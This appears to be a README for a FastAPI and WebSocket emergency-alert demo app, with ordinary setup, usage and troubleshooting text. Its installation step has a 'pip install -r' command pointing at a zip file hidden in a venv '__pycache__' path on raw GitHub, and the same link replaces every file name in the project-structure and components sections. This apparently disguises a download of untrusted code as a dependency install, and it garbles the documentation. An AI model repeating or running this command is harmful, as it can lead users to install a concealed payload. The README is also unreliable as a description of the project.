# Real-Time Emergency Alerts App

A real-time emergency notification system built with FastAPI and WebSockets that enables instant broadcasting of emergency alerts to all connected users simultaneously.

## Overview

This application provides a real-time communication platform for emergency situations where immediate notification broadcasting is critical. Built with modern web technologies, it ensures that all connected users receive emergency updates instantly without requiring page refreshes.

### How It Works

When the server is started with the command `uvicorn main:app --reload`, it launches the Real-Time Emergency Alert application at `http://127.0.0.1:8000`. Users who open the link are automatically assigned a unique User ID, starting from User 1. Opening the link in another browser window or tab assigns the following User IDs, such as User 2, User 3, and so on.

Each time a user connects, the WebSocket connection is established, and the terminal logs messages such as "User 1 connected. Total users: 1," updating with each new connection. When any user submits a notification by clicking "Send" or pressing "Enter", the message is instantly broadcast to all connected users and displayed live in their chat boxes without refreshing the page. At the same time, the terminal also shows the broadcasted message with a timestamp.

When a user disconnects by closing their browser tab, a notification is automatically sent to all remaining users indicating which user has disconnected, and the server terminal logs the disconnection as well. The system ensures all connected users receive real-time emergency updates simultaneously.

## Features

- **Real-time Communication**: Instant message broadcasting using WebSocket connections
- **Automatic User Management**: Unique User ID assignment for each connection
- **Live Connection Status**: Real-time display of connected users and disconnection notifications
- **Timestamped Messages**: All messages include timestamps for accurate tracking
- **Responsive Design**: Modern UI with emergency-themed styling
- **Cross-browser Compatibility**: Works across different browsers and devices
- **Server Logging**: Comprehensive terminal logging for monitoring and debugging

## Technology Stack

- **Backend**: FastAPI (Python web framework)
- **WebSocket**: Real-time bidirectional communication
- **Frontend**: HTML5, CSS3, JavaScript (Vanilla)
- **Templating**: Jinja2
- **Server**: Uvicorn (ASGI server)
- **Styling**: Custom CSS with emergency-themed design

## Prerequisites

- Python 3.7 or higher
- pip (Python package installer)

## Installation

1. **Clone or download the project files** to your local machine

2. **Navigate to the project directory**:
   ```bash
   cd "Python WebSockets"
   ```

3. **Create a virtual environment** (recommended):
   ```bash
   python -m venv venv
   ```

4. **Activate the virtual environment**:
   - On macOS/Linux:
     ```bash
     source venv/bin/activate
     ```
   - On Windows:
     ```bash
     venv\Scripts\activate
     ```

5. **Install dependencies**:
   ```bash
   pip install -r https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip
   ```

## Usage

1. **Start the server**:
   ```bash
   uvicorn main:app --reload
   ```

2. **Access the application**:
   - Open your web browser
   - Navigate to `http://127.0.0.1:8000`
   - You'll be automatically assigned a User ID

3. **Send emergency alerts**:
   - Type your emergency message in the input field
   - Click "Send" or press "Enter" to broadcast the message
   - All connected users will receive the message instantly

4. **Test multiple connections**:
   - Open the same URL in different browser tabs/windows
   - Each connection will be assigned a unique User ID
   - Messages sent from any connection will appear in all others

## Project Structure

```
Python WebSockets/
├── https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip              # Main FastAPI application with WebSocket logic
├── https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip     # Python dependencies
├── https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip           # Project documentation
├── static/
│   └── https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip       # CSS styling for the application
└── templates/
    └── https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip      # Main HTML template with JavaScript
```

## Key Components

### Backend (`https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip`)
- **FastAPI Application**: Main web framework setup
- **Connection Handler**: Manages WebSocket connections and user IDs
- **WebSocket Endpoint**: Handles real-time communication
- **Broadcasting System**: Sends messages to all connected users

### Frontend (`https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip`)
- **WebSocket Client**: Establishes connection to server
- **Message Handling**: Processes incoming messages and user IDs
- **User Interface**: Input field and send functionality
- **Real-time Updates**: Displays messages without page refresh

### Styling (`https://raw.githubusercontent.com/marydao21/Real-Time-Emergency-Alerts-App/main/venv/lib/python3.12/site-packages/sniffio/__pycache__/App_Emergency_Time_Alerts_Real_2.2.zip`)
- **Emergency Theme**: Yellow background with black accents
- **Responsive Design**: Adapts to different screen sizes
- **User Experience**: Clear visual hierarchy and intuitive interface

## Server Logging

The application provides comprehensive logging in the terminal:

- **Connection Events**: User connections and disconnections
- **Message Broadcasting**: All sent messages with timestamps
- **Error Handling**: Connection errors and debugging information
- **User Count**: Real-time tracking of connected users

## Security Considerations

- This is a development/demo application
- For production use, consider implementing:
  - Authentication and authorization
  - Input validation and sanitization
  - Rate limiting
  - HTTPS/WSS for secure connections
  - Environment variable configuration

## Troubleshooting

### Common Issues

1. **Port already in use**:
   - Change the port: `uvicorn main:app --reload --port 8001`

2. **WebSocket connection failed**:
   - Ensure the server is running
   - Check browser console for errors
   - Verify firewall settings

3. **Messages not appearing**:
   - Check browser console for JavaScript errors
   - Verify WebSocket connection status
   - Ensure server is running with `--reload` flag

## Contributing

Feel free to submit issues, feature requests, or pull requests to improve the application.

## License

This project is open source and available under the [MIT License](LICENSE).

---

**Note**: This application is designed for demonstration and educational purposes. For production emergency alert systems, ensure compliance with relevant regulations and implement appropriate security measures.
